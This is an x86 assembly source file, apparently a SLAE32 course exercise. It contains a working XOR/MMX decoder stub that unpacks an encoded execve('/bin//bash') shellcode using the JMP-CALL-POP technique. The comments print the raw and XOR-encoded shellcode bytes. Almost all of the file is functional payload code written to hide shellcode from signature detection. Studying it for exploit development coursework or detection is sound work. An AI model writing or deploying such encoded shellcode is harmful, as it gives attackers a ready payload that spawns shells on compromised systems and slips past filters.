; EXECVE-MMX-XOR-decoder.nasm (JMP-CALL-POP)
; SLAE32
; XOR Decoder using MMX, no NULL, using shellcode from Module 2-6 as the basis
;
; MMX operates on 8 bytes at a time.  Shellcode needs to be divisible by 8
;
; Then using the Python3 script "XOR-encoder.py" to encode the shellcode with 0xAA
; Note: No bytes contained in shellcode can match the 0xAA for this lesson
; 
; Before XOR Encoding:          "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
; After XOR (0xAA) Encoding:    "\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
; 
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;   - execve does NOT need a return if successful
; EAX = syscall
; EBX = /bin/bash, 0x0
; ECX = Address of /bin/bash,0x00000000
; EDX = 0x00000000
; ESI -> /bin/bash
;

global _start

section .text
_start:
    jmp short call_decoder


decoder:
    pop edi                     ; Get the address of decoder_value (since it's the return location after call decoder)
    lea esi, [edi + 8]          ; Get the address of EncodedShellcode, which is after the 8 bytes of decoder_value

    xor ecx, ecx
    mov cl, 4                   ; 8 * 4 == 32.  Shellcode is 30 bytes.  Execve will not grab those 2 bytes that are overwriting something.
    ; Afterthought:  Best bet is to pad this using NOPs or similar until it is divisible by 8


decode:
    movq mm0, qword [edi]       ; Grab 8 bytes of decoder_value (0xAA)
    movq mm1, qword [esi]       ; Grab 8 bytes of Encoded_Shellcode
    pxor mm0, mm1               ; XOR them (since the decode XOR is 0xAA)

    movq qword [esi], mm0       ; Put the clean shellcode back in place where it goes

    add esi, 0x8                ; Get to next 8 bytes of shellcode
    loop decode                 ; Loop over decode until ECX (4) is decremented to 0.

    jmp short EncodedShellcode


call_decoder:
    call decoder
    decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa        ; 8 bytes of 0xAA (MMX works in 8 bytes)
    EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0xc8,0xc3,0xc4,0x85,0xc2,0x85,0x85,0x85,0x85,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a